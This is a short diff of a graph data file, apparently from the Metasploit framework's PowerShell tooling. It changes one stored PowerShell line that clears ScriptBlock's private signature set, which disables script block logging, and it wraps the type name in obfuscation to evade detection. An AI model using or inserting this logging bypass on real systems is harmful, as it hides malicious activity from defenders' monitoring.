@@ -149,7 +149,7 @@
         <node id="block.19:instruction.20">
           <data key="address">20</data>
           <data key="type">instruction</data>
-          <data key="instruction.source">        [ScriptBlock].GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));</data>
+          <data key="instruction.source">        [Ref].Assembly.GetType(&lt;%= Rex::Powershell::Obfu.scate_string_literal('System.Management.Automation.ScriptBlock') %&gt;).GetField('signatures','NonPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]));</data>
         </node>
         <node id="block.19:instruction.21">
           <data key="address">21</data>
